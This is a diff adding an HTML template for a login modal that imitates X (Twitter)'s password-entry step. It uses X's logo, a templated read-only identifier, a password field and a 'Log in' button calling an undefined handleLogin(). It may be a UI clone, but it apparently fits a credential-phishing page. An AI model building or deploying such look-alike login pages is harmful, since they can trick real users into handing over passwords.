@@ -1,0 +1,107 @@
+<div id="loginModal" style="
+    background-color: white;
+    text-align: center;
+    padding: 40px 24px;
+    border-radius: 20px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    font-family: 'Segoe UI', Roboto, sans-serif;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    z-index: 1000;
+    width: 90%;
+    max-width: 400px;
+">
+
+  <!-- Close button -->
+  <button class="close-modal" style="
+      position: absolute;
+      
+      top: 15px;
+      font-size: 24px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      line-height: 1;">&times;</button>
+
+  <!-- Logo -->
+  <div style="text-align: center; margin-bottom: 24px;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/X_logo_2023_original.svg" alt="X logo" style="width: 32px; height: 32px;">
+  </div>
+
+  <!-- Title -->
+  <h2 style="font-size: 24px; font-weight: 700; margin-bottom: 32px; text-align: left;">Enter your password</h2>
+
+  <!-- Identifier (readonly) -->
+  <input type="text" id="identifier" name="identifier" value="{{ identifier }}" readonly style="
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 16px;
+      border-radius: 8px;
+      border: none;
+      background-color: #f7f9f9;
+      font-size: 16px;
+      color: #536471;
+  ">
+
+  <!-- Password -->
+  <div style="position: relative; width: 100%;">
+  <input type="password" id="password" name="password" placeholder="Password" style="
+      width: 100%;
+      padding: 14px 40px 14px 14px; /* Right padding to make space for the eye */
+      margin-bottom: 8px;
+      border-radius: 8px;
+      border: 2px solid #1da1f2;
+      font-size: 16px;
+  ">
+  <button id="togglePassword" type="button" style="
+      position: absolute;
+      top: 50%;
+      right: 12px;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #536471;
+      padding: 0;
+      margin: 0;
+  ">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M12 5C5 5 1 12 1 12C1 12 5 19 12 19C19 19 23 12 23 12C23 12 19 5 12 5Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      <path d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </button>
+</div>
+
+  <!-- Forgot password -->
+  <div style="text-align: left; width: 100%; margin-bottom: 32px;">
+    <a href="/forgot-password" style="
+        font-size: 14px;
+        color: #1da1f2;
+        text-decoration: none;
+    ">Forgot password?</a>
+  </div>
+
+  <!-- Log in button -->
+  <button type="submit" style="
+      width: 100%;
+      background-color: #000000;
+      color: white;
+      padding: 14px;
+      font-weight: bold;
+      border: none;
+      border-radius: 9999px;
+      cursor: pointer;
+      font-size: 16px; 
+  " onclick="handleLogin()">Log in</button>
+
+  <!-- Sign up -->
+  <div style="margin-top: 32px; font-size: 14px;">
+    Don't have an account? <a href="/signup" style="color: #1da1f2; text-decoration: none;">Sign up</a>
+  </div>
+
+  <!-- Message area -->
+  <div id="identifierMessage" style="margin-top: 10px; font-size: 14px;"></div>
+
+</div>
